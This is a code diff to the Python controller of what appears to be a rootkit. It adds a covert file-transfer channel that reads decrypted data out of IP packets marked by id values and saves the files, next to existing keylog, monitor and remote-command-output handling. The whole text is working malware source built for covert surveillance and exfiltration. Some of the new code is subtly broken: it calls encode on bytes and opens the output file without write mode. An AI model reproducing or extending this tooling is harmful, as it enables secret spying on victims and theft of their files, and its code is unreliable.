@@ -53,12 +53,14 @@ ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 QUEUE = SimpleQueue()
 COMMAND_OUTPUT_QUEUE = SimpleQueue()
+FILE_DATA_QUEUE = SimpleQueue()
 STREAM_ENCRYPTION_HANDLER = StreamEncryption()
 BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
 MONITOR_IDENTIFICATION = 14562
 KEYLOG_IDENTIFICATION = 32586
 GENERAL_MSG_IDENTIFICATION = 19375
 COMMAND_OUTPUT_IDENTIFICATION = 51486
+FILE_TRANSFER_IDENTIFICATION = 39182
 
 
 # Initialize the encryption context.
@@ -92,6 +94,8 @@ def subprocess_packet_handler(pkt):
         write_monitor_data(encrypted_message)
     if pkt[IP].id == COMMAND_OUTPUT_IDENTIFICATION:
         COMMAND_OUTPUT_QUEUE.put(encrypted_message)
+    if pkt[IP].id == FILE_TRANSFER_IDENTIFICATION:
+        FILE_DATA_QUEUE.put(encrypted_message)
 
 
 def write_keylog_data(data):
@@ -173,6 +177,68 @@ def receive_command_output():
         print("Timed out waiting for response...")
     else:
         print(command_output)
+
+
+def receive_file_transfer():
+    attempts = 0
+    bytes_received = 0
+    bytes_expected = maxsize
+    file_bytes = b''
+    while attempts < 3 and bytes_received < bytes_expected:
+        if FILE_DATA_QUEUE.empty():
+            attempts += 1
+            sleep(1)
+            continue
+        else:
+            encrypted = FILE_DATA_QUEUE.get()
+            decrypted = BLOCK_ENCRYPTION_HANDLER.decrypt(encrypted)
+            bytes_received += len(decrypted)
+            attempts = 0
+            if b'NUM_BYTES:' in decrypted or b'FILENAME:' in decrypted:
+                parts = decrypted.split(b' ')
+                filename = parts[0].split(b':')[1].encode()
+                bytes_expected = int(parts[1].split(b':')[1].encode("utf-8"))
+                continue
+            file_bytes += decrypted
+    if attempts == 3:
+        print("Timed out waiting for response...")
+    else:
+        # Save the file.
+        new_filename_found = False
+        while not new_filename_found:
+            if os.path.exists(f"downloads/{filename}"):
+                filename = increment_version(filename)
+            else:
+                new_filename_found = True
+                with open(f"downloads/{filename}") as f:
+                    f.write(file_bytes)
+                print("File saved successfully.")
+
+
+def increment_version(filename):
+    filename_no_extension = ""
+    extension = ""
+    index = 0
+    for i in range(0, len(filename)):
+        if filename[i] == ".":
+            filename_no_extension = filename[0:i]
+            extension = filename[i:]
+            break
+        else:
+            filename_no_extension += filename[i]
+    version = 0
+    parts = filename_no_extension.split("-")
+    x = len(parts)
+    try:
+        version = int(parts[x-1])
+    except ValueError:
+        pass
+    if version != 0:
+        new_filename = filename_no_extension.replace(f"-{version}", f"-{version+1}")
+    else:
+        new_filename = filename_no_extension + f"-{version+1}"
+    print(new_filename)
+    return new_filename + extension
 
 
 def arg_list_to_string(args: list):
